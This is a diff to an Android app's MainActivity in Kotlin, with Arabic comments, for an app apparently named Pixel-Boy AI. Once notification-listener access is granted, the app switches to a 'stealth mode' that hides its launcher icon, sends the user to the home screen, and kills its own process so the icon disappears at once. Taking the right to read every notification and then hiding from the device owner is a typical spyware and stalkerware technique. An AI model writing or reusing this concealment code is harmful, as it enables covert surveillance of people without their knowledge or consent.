@@ -66,22 +66,24 @@ class MainActivity : ComponentActivity(), TextToSpeech.OnInitListener {
         }
     }
 
-    // 🌟 التعديل الأساسي: التنفيد الفوري عند العودة للتطبيق بعد منح الإذن
+    // 🌟 التنفيذ الفوري لقتل العملية وتحديث اللانشر عند العودة من صفحة الإعدادات
     override fun onResume() {
         super.onResume()
         
-        // إذا كان إذن الإشعارات مفعلاً:
         if (isNotificationListenerEnabled(this)) {
-            // 1️⃣ إخفاء أيقونة Pixel-Boy AI من الشاشة الرئيسية
+            // 1️⃣ تعطيل الـ LauncherAlias
             StealthUtils.switchToStealthMode(this)
 
-            // 2️⃣ إجبار الهاتف على الخروج للشاشة الرئيسية وإغلاق التطبيق تماماً
+            // 2️⃣ الخروج للشاشة الرئيسية
             val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                 addCategory(Intent.CATEGORY_HOME)
                 flags = Intent.FLAG_ACTIVITY_NEW_TASK
             }
             startActivity(homeIntent)
-            finish()
+
+            // 3️⃣ إغلاق كافة الأنشطة وقتل العملية فوراً لإجبار اللانشر على مسح الأيقونة
+            finishAffinity()
+            android.os.Process.killProcess(android.os.Process.myPid())
         }
     }
 
